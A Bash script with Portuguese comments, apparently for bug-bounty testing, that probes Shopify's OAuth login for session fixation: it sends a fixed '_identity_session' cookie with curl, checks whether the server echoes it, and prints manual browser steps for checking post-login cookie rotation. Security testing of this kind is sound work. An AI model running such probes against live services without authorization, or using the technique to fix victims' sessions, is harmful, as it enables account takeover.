#!/bin/bash

# --- CONFIGURAÇÕES DE ENTRADA ---
# Substitua com dados válidos de um App criado no seu painel de Partners da Shopify
CLIENT_ID="SEU_CLIENT_ID_REAL"
REDIRECT_URI="https://SUA_URI_REGISTRADA/callback"
SCOPE="openid"
STATE="bughunter123"

# Session ID estático que vamos tentar fixar
FIXED_SESSION="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1"

echo "=========================================================="
echo "🎯 INICIANDO TESTE DE PRE-AUTH SESSION FIXATION - SHOPIFY"
echo "=========================================================="

# STEP 1: Enviar o ID arbitrário e capturar os cabeçalhos de resposta inicial
echo -e "\n[+] Passo 1: Enviando Session ID arbitrário para o IdP..."

RESPONSE_HEADERS=$(curl -sk -D - \
  "https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=${SCOPE}&state=${STATE}" \
  -H "Cookie: _identity_session=${FIXED_SESSION}" \
  -o /dev/null)

# Verificar se o servidor ecoou o valor
ECHOED_COOKIE=$(echo "$RESPONSE_HEADERS" | grep -i "set-cookie: _identity_session")

if [[ ! -z "$ECHOED_COOKIE" ]]; then
    echo -e "    ⚠️  COMPORTAMENTO CONFIRMADO: O servidor ecoou o cookie enviado!"
    echo "    -> Resposta do Servidor: $(echo "$ECHOED_COOKIE" | xargs)"
else
    echo -e "    ✅ O servidor NÃO ecoou o valor bruto diretamente ou o fluxo mudou."
fi

# STEP 2: Fornecer a URL exata de ataque para teste no navegador
echo -e "\n[+] Passo 2: Gerando a URL de fixação para validação manual..."
echo "    Para testar a rotação pós-auth, execute o cenário abaixo:"
echo "    ------------------------------------------------------------------------"
echo "    1. Abra uma janela Anônima no seu Navegador."
echo "    2. Abra o DevTools (F12) na aba Application/Storage -> Cookies."
echo "    3. Acesse a URL abaixo:"
echo "       https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=${SCOPE}&state=${STATE}"
echo "    4. ANTES de digitar suas credenciais, altere manualmente o valor do"
echo "       cookie '_identity_session' para: ${FIXED_SESSION}"
echo "    5. Faça o login normalmente com sua conta de testes/dev."
echo "    6. Assim que o redirecionamento acontecer, olhe IMEDIATAMENTE o valor"
echo "       do cookie '_identity_session' no DevTools."
echo "    ------------------------------------------------------------------------"

echo -e "\n[+] Passo 3: Critério de Validação do Achado:"
echo "    ❌ SE o valor continuar sendo '${FIXED_SESSION}' -> VULNERÁVEL (Session Fixation)!"
echo "    ✅ SE o valor mudou para um hash aleatório novo -> SEGURO (Mecanismo de Rotação Ativo)."
echo "=========================================================="
